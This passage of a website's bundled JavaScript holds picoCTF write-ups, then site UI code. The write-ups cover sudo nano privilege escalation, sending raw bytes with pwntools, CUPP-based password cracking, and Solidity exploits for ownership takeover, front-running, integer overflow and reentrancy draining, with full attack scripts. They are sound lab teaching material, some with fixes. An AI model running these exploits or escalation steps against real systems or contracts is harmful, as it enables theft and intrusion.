### 4. Read arbitrary files

Since \`nano\` is running as root, it can also read protected files into the editor buffer.

Again, valid, but less convenient over a remote interactive TTY than just executing a root command.

## Chosen path

The cleanest solve was:

1. run \`sudo /bin/nano /etc/sudoers\`
2. use \`^R^X\`
3. execute a root command that copies the protected flag to a readable file
4. reconnect and read the copied file normally

## Step 2: Start root nano

Because some terminals cause issues with \`nano\`, set a simple terminal type first:

\`\`\`bash
export TERM=xterm
sudo /bin/nano /etc/sudoers
\`\`\`

## Step 3: Use nano's execute-command feature

Inside \`nano\`, press:

\`\`\`text
Ctrl-R
Ctrl-X
\`\`\`

That opens the \`Command to execute:\` prompt.

At that prompt, run:

\`\`\`bash
cp /home/ctf-player/flag.txt /home/ctf-player/flag_copy.txt; chmod 644 /home/ctf-player/flag_copy.txt
\`\`\`

Why this works:

- \`nano\` is running as \`root\`
- the command therefore runs as \`root\`
- it copies the protected file
- then makes the copy world-readable

This avoids relying on a fully interactive root shell.

## Step 4: Read the copied flag

After the root command succeeds:

\`\`\`bash
cat /home/ctf-player/flag_copy.txt
\`\`\`

Output:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

The challenge is about treating \`nano\` as more than a text editor.

Granting:

\`\`\`text
sudo /bin/nano /etc/sudoers
\`\`\`

is effectively dangerous because \`nano\` is not a passive editor. It can:

- read arbitrary files
- execute commands
- sometimes spawn shells

So the sudo rule accidentally grants root-level actions even though it appears restricted.

## Minimal solve path

\`\`\`bash
ssh -p 55799 ctf-player@crystal-peak.picoctf.net
export TERM=xterm
sudo /bin/nano /etc/sudoers
\`\`\`

Inside \`nano\`:

\`\`\`text
Ctrl-R
Ctrl-X
\`\`\`

Command:

\`\`\`bash
cp /home/ctf-player/flag.txt /home/ctf-player/flag_copy.txt; chmod 644 /home/ctf-player/flag_copy.txt
\`\`\`

Back in the shell:

\`\`\`bash
cat /home/ctf-player/flag_copy.txt
\`\`\`

## Takeaway

Allowing editors under \`sudo\` is often equivalent to allowing command execution. \`nano\`, \`vi\`, \`vim\`, \`less\`, and similar programs can frequently be abused for shell escape, file read, or privilege escalation.
`},{id:`bytemancy-2`,title:`bytemancy 2`,excerpt:`picoCTF Bytemancy 2 writeup sending raw bytes to a network service using pwntools to satisfy binary protocol requirements and retrieve the flag.`,category:`picoCTF - General Skills`,content:`# bytemancy 2

## Challenge

**Category:** General Skills  
**Name:** bytemancy 2

**Prompt summary:**

- source code provided as \`app.py\`
- connect with:

\`\`\`bash
nc lonely-island.picoctf.net 57958
\`\`\`

- hint:

> There's no way to print these bytes  
> Use pwntools to send raw bytes over the network

## Goal

Send the exact raw byte sequence the server expects and get the flag.

## Step 1: Read the source

The provided source is:

\`\`\`python
import sys

while(True):
  try:
    print('Send me the HEX BYTE 0xFF 3 times, side-by-side, no space.')
    print('==> ', end='', flush=True)
    user_input = sys.stdin.buffer.readline().rstrip(b"\\n")
    if user_input == b"\\xff\\xff\\xff":
      print(open("./flag.txt", "r").read())
      break
    else:
      print("That wasn't it. I got: " + str(user_input))
  except Exception as e:
    print(e)
    break
\`\`\`

The important line is:

\`\`\`python
if user_input == b"\\xff\\xff\\xff":
\`\`\`

So the service expects exactly:

\`\`\`text
\\xff\\xff\\xff
\`\`\`

which is three raw bytes with hexadecimal value \`FF\`.

## Why normal typing does not work

If you type:

\`\`\`text
fff
\`\`\`

or:

\`\`\`text
\\xff\\xff\\xff
\`\`\`

that sends ASCII characters, not raw byte \`0xFF\`.

The server reads from:

\`\`\`python
sys.stdin.buffer
\`\`\`

so it is comparing binary data, not text.

## Step 2: Use pwntools to send raw bytes

The simplest solve is:

\`\`\`python
from pwn import remote

io = remote('lonely-island.picoctf.net', 57958)
io.recvuntil(b'==> ')
io.send(b'\\xff\\xff\\xff\\n')
print(io.recvall(timeout=3).decode('latin1', 'replace'))
\`\`\`

### Explanation

- \`remote(...)\` connects to the service
- \`recvuntil(b'==> ')\` waits for the prompt
- \`send(b'\\xff\\xff\\xff\\n')\` sends the three required bytes and then a newline
- the server strips the newline with \`.rstrip(b"\\n")\`
- the remaining bytes are exactly \`b"\\xff\\xff\\xff"\`

## Step 3: Get the flag

Running the script returned:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Minimal solve

\`\`\`python
from pwn import remote

io = remote('lonely-island.picoctf.net', 57958)
io.recvuntil(b'==> ')
io.send(b'\\xff\\xff\\xff\\n')
print(io.recvall().decode())
\`\`\`

## Takeaway

When a challenge compares against a Python bytes literal like:

\`\`\`python
b"\\xff\\xff\\xff"
\`\`\`

you must send raw bytes, not printable text. \`pwntools\` makes this easy because \`send()\` accepts exact byte strings.
`},{id:`password-profiler`,title:`Password Profiler Writeup`,excerpt:`picoCTF Password Profiler writeup using CUPP to generate a custom wordlist from OSINT data and cracking a SHA-1 hash to recover the password.`,category:`picoCTF - General Skills`,content:`# Password Profiler Writeup

Recovered password: \`Aj_15901990\`
Flag format from checker: \`picoCTF{<redacted>}\`

## Files
- \`userinfo.txt\`
- \`hash.txt\`
- \`check_password.py\`

## Goal
Use OSINT details from \`userinfo.txt\` to build a custom password list, then crack the SHA-1 hash in \`hash.txt\` with the provided checker.

## Source Data
\`\`\`text
First Name: Alice
Surname: Johnson
Nickname: AJ
Birthdate: 15-07-1990
Partner's Name: Bob
Child's Name: Charlie
\`\`\`

Target SHA-1:
\`\`\`text
968c2349040273dd57dc4be7e238c5ac200ceac5
\`\`\`

## Tool Used
- \`cupp\`
- \`python3\`

## Solve Steps

1. Generate a custom wordlist with CUPP.
\`\`\`bash
cd /home/kali/Downloads
cupp -i -q
\`\`\`

2. Feed the victim profile into CUPP.
\`\`\`text
First Name: Alice
Surname: Johnson
Nickname: AJ
Birthdate (DDMMYYYY): 15071990
Partners name: Bob
Partners nickname:
Partners birthdate (DDMMYYYY):
Childs name: Charlie
Childs nickname:
Childs birthdate (DDMMYYYY):
Pets name:
Company name:
Add keywords?: n
Add special chars?: y
Add random numbers?: y
Leet mode?: y
\`\`\`

3. CUPP writes the generated dictionary to \`alice.txt\`.
\`\`\`text
Saving dictionary to alice.txt, counting 17352 words.
\`\`\`

4. Copy that output to the filename expected by the checker and run the checker.
\`\`\`bash
cp alice.txt passwords.txt
python3 check_password.py
\`\`\`

## Result
\`\`\`text
Password found: picoCTF{<redacted>}
\`\`\`

## Why it Worked
- CUPP combines names, nickname, birthdate fragments, separators, random suffixes, and leetspeak variations.
- One of those generated combinations was \`Aj_15901990\`.
- The checker computes \`sha1(password)\` for each candidate in \`passwords.txt\` until it matches the target hash.

## Verification
You can verify directly in Python:
\`\`\`bash
python3 - <<'PY'
import hashlib
print(hashlib.sha1(b"Aj_15901990").hexdigest())
PY
\`\`\`

Expected output:
\`\`\`text
968c2349040273dd57dc4be7e238c5ac200ceac5
\`\`\`
`},{id:`access-control`,title:`Access_Control Writeup`,excerpt:`picoCTF Access Control writeup exploiting an unprotected owner-setter function in a Solidity smart contract to claim ownership and reveal the flag.`,category:`picoCTF - Blockchain`,content:`# Access_Control Writeup

Flag: picoCTF{<redacted>}

Tools used
- \`curl\`
- \`rg\`
- \`node\`
- \`npm install ethers@6\`
- \`ethers\` (installed under \`/tmp/node_modules\`)

Endpoints
- Web app: \`http://lonely-island.picoctf.net:52648/\`
- RPC: \`http://lonely-island.picoctf.net:62620\`
- Contract: \`0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9\`
- Player: \`0xECd115dC14231719f96d08c648476F3128F49C81\`

Recon commands
\`\`\`bash
curl -L http://lonely-island.picoctf.net:52648/
curl -L http://lonely-island.picoctf.net:52648/status
curl -s -X POST http://lonely-island.picoctf.net:62620 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
curl -s -X POST http://lonely-island.picoctf.net:62620 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","latest"],"id":1}'
\`\`\`

Dependency setup
\`\`\`bash
cd /tmp
npm install ethers@6
\`\`\`

Exploit summary
- The deployed bytecode exposed an unprotected owner-setting function at selector \`0xa6f9dae1\`.
- After setting \`owner\` to the player address, an owner-only function at selector \`0x890d6908\` marked the challenge solved.
- The flag was then readable via selector \`0xf9633930\`.

Exploit script
\`\`\`bash
node - <<'NODE'
const { ethers } = require('/tmp/node_modules/ethers');
const rpc = 'http://lonely-island.picoctf.net:62620';
const pk = '0xc3eeb0fddf58a623f9036b6e6d15a2111018cf938ff42a1bb09af4af87a314a5';
const contract = '0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9';
const player = '0xECd115dC14231719f96d08c648476F3128F49C81';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);

  const tx1 = await wallet.sendTransaction({
    to: contract,
    data: '0xa6f9dae1' + player.toLowerCase().slice(2).padStart(64, '0')
  });
  await tx1.wait();

  const tx2 = await wallet.sendTransaction({
    to: contract,
    data: '0x890d6908'
  });
  await tx2.wait();

  const flagData = await provider.call({ to: contract, data: '0xf9633930' });
  const [flag] = ethers.AbiCoder.defaultAbiCoder().decode(['string'], flagData);
  console.log(flag);
})();
NODE
\`\`\`

Verification
\`\`\`bash
curl -s http://lonely-island.picoctf.net:52648/status
\`\`\`
`},{id:`front-running`,title:`Front_Running Writeup`,excerpt:`picoCTF Front Running writeup monitoring the mempool for pending transactions, extracting the plaintext solution, and front-running with higher gas price.`,category:`picoCTF - Blockchain`,content:`# Front_Running Writeup

Flag: picoCTF{<redacted>}

Tools used
- \`curl\`
- \`node\`
- \`npm install ethers@6\`
- \`ethers\` (installed under \`/tmp/node_modules\`)
- \`4byte.directory\` for selector lookup

Endpoints
- Web app: \`http://candy-mountain.picoctf.net:57899/\`
- RPC: \`http://candy-mountain.picoctf.net:50495\`
- Contract: \`0x5FbDB2315678afecb367f032d93F642f64180aa3\`
- Attacker address: \`0x471e0887aa4A667841758a7A6283616798e7cfB5\`

Useful recon
\`\`\`bash
curl -L http://candy-mountain.picoctf.net:57899/
curl -s http://candy-mountain.picoctf.net:57899/status
curl -s -X POST http://candy-mountain.picoctf.net:50495 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
curl -s -X POST http://candy-mountain.picoctf.net:50495 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x5FbDB2315678afecb367f032d93F642f64180aa3","latest"],"id":1}'
curl -L -s 'https://www.4byte.directory/api/v1/signatures/?hex_signature=0x76fe1e92'
\`\`\`

Mempool monitoring
\`\`\`bash
curl -s -X POST http://candy-mountain.picoctf.net:50495 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_pendingTransactions","params":[],"id":1}'
\`\`\`

Victim pending transaction observed
\`\`\`text
from: 0x70997970c51812dc3a010c7d01b50e0d17dc79c8
to:   0x5FbDB2315678afecb367f032d93F642f64180aa3
gasPrice: 0x3b9aca00 (1 gwei)
input: 0x76fe1e92000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000177069636f4354467b6d336d7030306c5f7031723474337d000000000000000000
decoded string: \`picoCTF{<redacted>}\`
\`\`\`

Exploit idea
- The contract exposes \`solve(string)\` and checks \`keccak256(input)\` against a fixed target hash.
- The victim bot leaked the correct preimage in plaintext calldata while using only \`1 gwei\` gas price.
- Sending the exact same calldata from the attacker account with a higher gas price causes the miner to include the attacker transaction first.

Exploit script
\`\`\`bash
cd /tmp
npm install ethers@6

node - <<'NODE'
const { ethers } = require('/tmp/node_modules/ethers');
const rpc = 'http://candy-mountain.picoctf.net:50495';
const pk = '0xa75e3cc6962770a9a7be58a9a01a4d594f2ce2d3d68dcc360c6d6550d22e8bfd';
const contract = '0x5FbDB2315678afecb367f032d93F642f64180aa3';
const data = '0x76fe1e92000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000177069636f4354467b6d336d7030306c5f7031723474337d000000000000000000';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);

  const tx = await wallet.sendTransaction({
    to: contract,
    data,
    gasLimit: 150000n,
    gasPrice: ethers.parseUnits('3', 'gwei'),
    nonce: await provider.getTransactionCount(wallet.address, 'pending')
  });

  await tx.wait();

  const flagData = await provider.call({ to: contract, data: '0xf9633930' });
  const [flag] = ethers.AbiCoder.defaultAbiCoder().decode(['string'], flagData);
  console.log(flag);
})();
NODE
\`\`\`

Verification
\`\`\`bash
curl -s http://candy-mountain.picoctf.net:57899/status
\`\`\`
`},{id:`smart-overflow`,title:`Smart_Overflow Writeup`,excerpt:`picoCTF Smart Overflow writeup triggering a uint256 integer overflow in unchecked Solidity arithmetic to satisfy the flag reveal condition.`,category:`picoCTF - Blockchain`,content:`# Smart_Overflow Writeup

Flag: picoCTF{<redacted>}

Tools used
- \`curl\`
- \`node\`
- \`npm install ethers@6\`
- \`ethers\` (installed under \`/tmp/node_modules\`)
- \`4byte.directory\` for selector lookup

Endpoints
- Web app: \`http://mysterious-sea.picoctf.net:59216/\`
- RPC: \`http://mysterious-sea.picoctf.net:57602\`
- Contract: \`0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9\`
- Player address: \`0x051d3aD8Cae52E640e7D66405f6Ee6558377d0fa\`

Recon
\`\`\`bash
curl -L http://mysterious-sea.picoctf.net:59216/
curl -s http://mysterious-sea.picoctf.net:59216/status
curl -s -X POST http://mysterious-sea.picoctf.net:57602 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","data":"0x27e235e3000000000000000000000000051d3ad8cae52e640e7d66405f6ee6558377d0fa"},"latest"],"id":1}'
curl -L -s 'https://www.4byte.directory/api/v1/signatures/?hex_signature=0xb6b55f25'
curl -L -s 'https://www.4byte.directory/api/v1/signatures/?hex_signature=0x27e235e3'
\`\`\`

Bug
- \`deposit(uint256 amount)\` increases the internal balance using unchecked pre-0.8 Solidity arithmetic.
- The challenge reveals the flag if a deposit causes \`balances[msg.sender]\` to become smaller than it was before.
- Because the function does not require any matching \`msg.value\`, the attack is purely arithmetic.

Exploit idea
- Start from \`balances[player] == 0\`.
- Call \`deposit(1)\` so the internal balance becomes \`1\`.
- Call \`deposit(type(uint256).max)\`, which computes \`1 + (2^256 - 1) == 0\` modulo \`2^256\`.
- The new balance is smaller than the old one, so the contract sets \`revealed = true\`.

Exploit script
\`\`\`bash
cd /tmp
npm install ethers@6

node - <<'NODE'
const { ethers } = require('/tmp/node_modules/ethers');

const rpc = 'http://mysterious-sea.picoctf.net:57602';
const pk = '0x16841d4639affd5e6ea7a599911fc38d8aaffd7408a19567406eb5dc28d60b80';
const contract = '0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);
  const iface = new ethers.Interface([
    'function deposit(uint256 amount)',
    'function getFlag() view returns (string)'
  ]);

  let tx = await wallet.sendTransaction({
    to: contract,
    data: iface.encodeFunctionData('deposit', [1n])
  });
  await tx.wait();

  tx = await wallet.sendTransaction({
    to: contract,
    data: iface.encodeFunctionData('deposit', [ethers.MaxUint256])
  });
  await tx.wait();

  const flagData = await provider.call({
    to: contract,
    data: iface.encodeFunctionData('getFlag', [])
  });
  const [flag] = iface.decodeFunctionResult('getFlag', flagData);
  console.log(flag);
})();
NODE
\`\`\`

Verification
\`\`\`bash
curl -s http://mysterious-sea.picoctf.net:59216/status
\`\`\`
`},{id:`reentrance`,title:`Reentrance Writeup`,excerpt:`picoCTF Reentrance writeup deploying an attacker contract to exploit the classic reentrancy vulnerability and drain the bank contract to zero.`,category:`picoCTF - Blockchain`,content:`# Reentrance Writeup

Flag: picoCTF{<redacted>}

## Summary

This challenge is a classic reentrancy bug.

The vulnerable bank sends Ether to the caller before it updates the caller's internal balance. If the caller is a contract, its \`receive()\` function runs as soon as the Ether arrives. That callback can immediately call \`withdraw()\` again while the bank still believes the original balance is intact.

Because the challenge reveals the flag when the bank's on-chain balance reaches \`0\`, the exploit is to:

1. Deploy an attacker contract.
2. Deposit a small amount into the bank from that contract.
3. Call \`withdraw()\` once.
4. Re-enter \`withdraw()\` repeatedly from \`receive()\` until the bank is fully drained.

## Challenge Details

- Web UI: \`http://crystal-peak.picoctf.net:53465/\`
- RPC: \`http://crystal-peak.picoctf.net:52781\`
- Target bank: \`0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF\`
- Player address: \`0x68146Ba96F4aCaE3eD690cfd78C2CafA6B4b041C\`
- Player private key: \`0x47e7fe6e77a8ce43619e9e1c8414d4991633c3b8c6745a435ecadc0b53382691\`
- Bank starting balance: \`10 ETH\`
- Player starting balance: \`5 ETH\`

## Tools Used

- \`curl\`
- \`node\`
- \`npm install ethers\`
- \`npm install solc\`
- \`ethers\` from \`/tmp/node_modules\`
- raw JSON-RPC calls for code and balance checks

## Recon

### Pull the challenge page and status

\`\`\`bash
curl -L http://crystal-peak.picoctf.net:53465/
curl -s http://crystal-peak.picoctf.net:53465/status
\`\`\`

### Read the deployed bytecode

\`\`\`bash
curl -s -X POST http://crystal-peak.picoctf.net:52781 \\
  -H 'Content-Type: application/json' \\
  --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF","latest"],"id":1}'
\`\`\`

### Check the bank's ETH balance

\`\`\`bash
curl -s -X POST http://crystal-peak.picoctf.net:52781 \\
  -H 'Content-Type: application/json' \\
  --data '{"jsonrpc":"2.0","method":"eth_getBalance","params":["0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF","latest"],"id":1}'
\`\`\`

The bank started with:

\`\`\`text
0x8ac7230489e80000 = 10 ETH
\`\`\`

## Vulnerability Analysis

The critical logic in \`withdraw(uint256)\` is effectively:

\`\`\`solidity
require(amount <= balances[msg.sender], "Insufficient funds available");

(bool ok,) = msg.sender.call{value: amount}("");
require(ok, "Transfer failed");

balances[msg.sender] -= amount;
\`\`\`

That ordering is the bug.

### Why it is vulnerable

- The bank checks the balance first.
- Then it sends Ether to \`msg.sender\`.
- If \`msg.sender\` is a contract, that contract's \`receive()\` function runs immediately.
- At that moment, the bank has not reduced \`balances[msg.sender]\` yet.
- So the attacker contract can call \`withdraw(amount)\` again and pass the same balance check repeatedly.

This is the textbook reentrancy pattern: interaction before state update.

### Flag condition

The contract reveals the flag when the bank contract's own ETH balance hits zero.

That means the attack goal is not just “steal some Ether,” but “drain all Ether from the bank.”

## Exploit Strategy

Use an attacker contract with three parts:

1. \`attack()\` deposits \`1 ETH\` into the bank and immediately starts the first withdrawal.
2. \`receive()\` runs whenever the bank sends Ether back.
3. Inside \`receive()\`, if the bank still has at least \`1 ETH\`, call \`withdraw(1 ether)\` again.

### Why 1 ETH works

- The bank started with \`10 ETH\`.
- The attacker contract first deposits \`1 ETH\`, so the bank temporarily holds \`11 ETH\`.
- The attacker contract's internal bank balance is \`1 ETH\`.
- Because the bank only updates that internal balance after the external call returns, each nested withdrawal still sees \`balances[attacker] == 1 ether\`.
- Re-entering \`11\` times drains the full bank balance to \`0\`.

## Attacker Contract

\`\`\`solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.12 <0.9.0;

interface IVulBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getFlag() external view returns (string memory);
}

contract ReentranceAttacker {
    IVulBank public bank;
    address payable public owner;
    uint256 public amount;

    constructor(address _bank) {
        bank = IVulBank(_bank);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, "owner");
        require(msg.value > 0, "value");

        amount = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bankBal = address(bank).balance;
        if (bankBal >= amount) {
            bank.withdraw(amount);
        }
    }

    function sweep() external {
        require(msg.sender == owner, "owner");
        owner.transfer(address(this).balance);
    }
}
\`\`\`

## Full Solve Flow

### Install dependencies

\`\`\`bash
cd /tmp
npm install ethers
npm install solc
\`\`\`

### Compile, deploy, attack, and read the flag

\`\`\`bash
node - <<'NODE'
const solc = require('/tmp/node_modules/solc');
const { ethers } = require('/tmp/node_modules/ethers');

const source = \`// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.12 <0.9.0;

interface IVulBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getFlag() external view returns (string memory);
}

contract ReentranceAttacker {
    IVulBank public bank;
    address payable public owner;
    uint256 public amount;

    constructor(address _bank) {
        bank = IVulBank(_bank);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, 'owner');
        require(msg.value > 0, 'value');
        amount = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bal = address(bank).balance;
        if (bal >= amount) {
            bank.withdraw(amount);
        }
    }

    function sweep() external {
        require(msg.sender == owner, 'owner');
        owner.transfer(address(this).balance);
    }
}\`;

const input = {
  language: 'Solidity',
  sources: { 'ReentranceAttacker.sol': { content: source } },
  settings: { outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } }
};

const output = JSON.parse(solc.compile(JSON.stringify(input)));
const c = output.contracts['ReentranceAttacker.sol']['ReentranceAttacker'];
const abi = c.abi;
const bytecode = '0x' + c.evm.bytecode.object;

const rpc = 'http://crystal-peak.picoctf.net:52781';
const pk = '0x47e7fe6e77a8ce43619e9e1c8414d4991633c3b8c6745a435ecadc0b53382691';
const bankAddr = '0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);
  const bank = new ethers.Contract(bankAddr, ['function getFlag() view returns (string memory)'], provider);

  const factory = new ethers.ContractFactory(abi, bytecode, wallet);
  const attacker = await factory.deploy(bankAddr);
  await attacker.waitForDeployment();

  let tx = await attacker.attack({ value: ethers.parseEther('1') });
  await tx.wait();

  tx = await attacker.sweep();
  await tx.wait();

  const flag = await bank.getFlag();
  console.log(flag);
})();
NODE
\`\`\`

## What Happened On-Chain

Observed during the solve:

- Bank balance before attack: \`10000000000000000000\` wei (\`10 ETH\`)
- Attacker contract deployed at: \`0xf0be961E0ed50020AEA40F6a351D66a9eCBa2DdB\`
- Attack transaction: \`0x1a3f4af94d45b7f330bf88b14f1dca3bb81cdf41f793df0e538adbae4bb87eea\`
- Bank balance after attack: \`0\`
- Attacker contract balance after drain: \`11000000000000000000\` wei (\`11 ETH\`)

The extra \`1 ETH\` is the attacker's original deposit, recovered along with the stolen funds.

## Verification

### Challenge status endpoint

\`\`\`bash
curl -s http://crystal-peak.picoctf.net:53465/status
\`\`\`

### Result

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Root Cause

This bug exists because the contract violates the Checks-Effects-Interactions pattern.

Correct order should be:

1. Check preconditions.
2. Update internal state.
3. Interact with external contracts.

The vulnerable contract instead does:

1. Check.
2. Interact.
3. Update state.

That ordering allows a malicious contract to re-enter before its balance is reduced.

## Fix

The direct fix is to subtract the balance before the external call:

\`\`\`solidity
function withdraw(uint256 amount) external {
    require(amount <= balances[msg.sender], "Insufficient funds available");

    balances[msg.sender] -= amount;

    (bool ok,) = msg.sender.call{value: amount}("");
    require(ok, "Transfer failed");
}
\`\`\`

Additional defenses:

- Use OpenZeppelin \`ReentrancyGuard\`.
- Prefer pull-payment designs carefully.
- Minimize external calls in sensitive accounting paths.
`}],im=[{name:`Malware Analysis`,icon:`Search`,count:8},{name:`Binary Exploitation`,icon:`Binary`,count:14},{name:`Reverse Engineering`,icon:`Bug`,count:2},{name:`HTB Writeup`,icon:`Server`,count:4},{name:`CTF Writeup`,icon:`Trophy`,count:4},{name:`Resources`,icon:`BookOpen`,count:1},{name:`picoCTF - Binary Exploitation`,icon:`Binary`,count:8},{name:`picoCTF - Reverse Engineering`,icon:`Bug`,count:11},{name:`picoCTF - Web Exploitation`,icon:`Globe`,count:6},{name:`picoCTF - General Skills`,icon:`Terminal`,count:8},{name:`picoCTF - Blockchain`,icon:`Link`,count:4}];function am(){return(0,G.jsx)(`footer`,{className:`border-t border-border bg-theme-light/70 py-10 dark:border-dm-border dark:bg-dm-theme-dark/60`,children:(0,G.jsxs)(`div`,{className:`container`,children:[(0,G.jsxs)(`div`,{className:`grid gap-8 md:grid-cols-[1.3fr_0.7fr_0.7fr]`,children:[(0,G.jsxs)(`div`,{children:[(0,G.jsxs)(Tn,{to:`/`,className:`font-secondary text-2xl font-bold text-dark dark:text-white`,children:[`f4zzie`,(0,G.jsx)(`span`,{className:`text-primary dark:text-dm-primary`,children:`/MyNotes`})]}),(0,G.jsxs)(`p`,{className:`mt-4 max-w-xl text-sm leading-7 text-text dark:text-dm-text`,children:[`A cybersecurity research vault with `,rm.length,` notes across `,im.length,` tracks: malware analysis, reverse engineering, binary exploitation, HTB, picoCTF, and resources.`]})]}),(0,G.jsxs)(`div`,{children:[(0,G.jsx)(`h3`,{className:`text-sm font-bold uppercase tracking-[0.16em] text-dark dark:text-white`,children:`Navigate`}),(0,G.jsxs)(`div`,{className:`mt-4 grid gap-2 text-sm font-bold`,children:[(0,G.jsx)(Tn,{to:`/`,className:`footer-link`,children:`Home`}),(0,G.jsx)(Tn,{to:`/about`,className:`footer-link`,children:`About`}),(0,G.jsx)(Tn,{to:`/notes`,className:`footer-link`,children:`Notes`}),(0,G.jsx)(Tn,{to:`/projects`,className:`footer-link`,children:`Projects`})]})]}),(0,G.jsxs)(`div`,{children:[(0,G.jsx)(`h3`,{className:`text-sm font-bold uppercase tracking-[0.16em] text-dark dark:text-white`,children:`Follow`}),(0,G.jsxs)(`div`,{className:`mt-4 flex gap-3`,children:[(0,G.jsx)(`a`,{href:`https://github.com/f4zzie`,target:`_blank`,rel:`noreferrer`,className:`icon-link`,"aria-label":`GitHub`,children:(0,G.jsx)(zp,{size:18})}),(0,G.jsx)(`a`,{href:`https://x.com/_lazerguard`,target:`_blank`,rel:`noreferrer`,className:`icon-link`,"aria-label":`X`,children:(0,G.jsx)(`svg`,{viewBox:`0 0 24 24`,className:`h-[18px] w-[18px] fill-current`,children:(0,G.jsx)(`path`,{d:`M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z`})})})]})]})]}),(0,G.jsxs)(`p`,{className:`mt-10 border-t border-border pt-6 text-sm text-light dark:border-dm-border`,children:[`© `,new Date().getFullYear(),` f4zzie. Built from the MyNotes vault.`]})]})})}var om=`/MyNotes/images/Pasted_image_20251207191613.png`,sm=e=>im.find(t=>t.name===e)?.count||0,cm=im.filter(e=>e.name.startsWith(`picoCTF`)).reduce((e,t)=>e+t.count,0),lm=[{label:`notes indexed`,value:rm.length.toString()},{label:`picoCTF solves`,value:cm.toString()},{label:`HTB writeups`,value:sm(`HTB Writeup`).toString()},{label:`malware labs`,value:sm(`Malware Analysis`).toString()}],um=[{icon:Yp,title:`Malware Analysis`,detail:`PE headers, APIs, strings, hashes, process injection, and static triage.`},{icon:Zp,title:`Exploitation`,detail:`Stack, heap, ROP, format strings, pwndbg workflows, and pwntools templates.`},{icon:jp,title:`CTF Writeups`,detail:`picoCTF 2026, HTB, THM, CyberStudents, web, blockchain, RE, and pwn.`}];function dm(){return(0,G.jsxs)(`section`,{className:`hero-shell relative overflow-hidden text-white`,children:[(0,G.jsx)(`img`,{src:om,alt:`Malware analysis lab screenshot`,className:`absolute inset-0 h-full w-full object-cover`}),(0,G.jsx)(`div`,{className:`absolute inset-0 bg-[#06111f]/85`}),(0,G.jsx)(`div`,{className:`absolute inset-0 bg-[linear-gradient(90deg,rgba(6,17,31,0.96),rgba(6,17,31,0.76),rgba(6,17,31,0.9))]`}),(0,G.jsxs)(`div`,{className:`container relative py-20 lg:py-24`,children:[(0,G.jsxs)(xp.div,{initial:{opacity:0,y:24},animate:{opacity:1,y:0},transition:{duration:.55},className:`max-w-4xl`,children:[(0,G.jsx)(`span`,{className:`eyebrow`,children:`f4zzie / MyNotes`}),(0,G.jsx)(`h1`,{className:`mt-5 max-w-3xl text-4xl font-bold leading-tight text-white sm:text-5xl lg:text-6xl`,children:`Cyber research notes for malware, reversing, exploitation, and CTFs.`}),(0,G.jsx)(`p`,{className:`mt-6 max-w-2xl text-base leading-8 text-slate-200 sm:text-lg`,children:`A living vault of practical writeups: static malware analysis, binary exploitation methodology, HTB attack chains, picoCTF 2026 solves, and the tools that make the work repeatable.`}),(0,G.jsxs)(`div`,{className:`mt-8 flex flex-wrap gap-3`,children:[(0,G.jsxs)(Tn,{to:`/notes`,className:`btn btn-primary`,children:[`Browse Notes`,(0,G.jsx)(kp,{size:17,className:`ml-2`})]}),(0,G.jsx)(Tn,{to:`/about`,className:`btn btn-ghost-light`,children:`Focus Areas`})]})]}),(0,G.jsx)(`div`,{className:`mt-12 grid gap-3 sm:grid-cols-2 lg:grid-cols-4`,children:lm.map((e,t)=>(0,G.jsxs)(xp.div,{initial:{opacity:0,y:18},animate:{opacity:1,y:0},transition:{delay:.15+t*.06},className:`stat-tile`,children:[(0,G.jsx)(`span`,{className:`text-3xl font-bold text-white`,children:e.value}),(0,G.jsx)(`span`,{className:`text-xs font-bold uppercase tracking-[0.18em] text-slate-300`,children:e.label})]},e.label))}),(0,G.jsx)(`div`,{className:`mt-4 